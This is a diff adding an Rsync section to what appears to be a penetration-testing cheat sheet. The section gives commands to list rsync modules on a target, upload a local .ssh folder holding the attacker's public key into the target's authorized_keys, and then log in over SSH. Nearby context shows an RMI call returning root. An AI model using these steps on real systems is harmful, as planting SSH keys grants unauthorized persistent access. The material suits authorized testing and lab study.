@@ -430,6 +430,23 @@ $ rmg call [target [rmi_port] '"id"' \
 [+] uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### Rsync [873 TCP]
+
+Rsync is a utility for transferring and synchronizing files between computers.
+
+Enable use of Kali SSH key to access target
+* NOTE: You may need to enum creds to use the rsync service.
+```bash
+# add kali SSH pub key to 'authorized_keys' file
+$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+# rysnc operations
+$ rsync [target]::              # list available folders
+$ rsync [target]::/[folder]     # list files in folder
+$ rsync -av ~/.ssh [target]::/[folder]/.ssh # transfer authorized_key file
+$ ssh -v [remote_user]@[target] # ssh as remote user using Kali SSH key
+```
+
 ### MSSQL [1433 TCP]
 
 MSSQL client
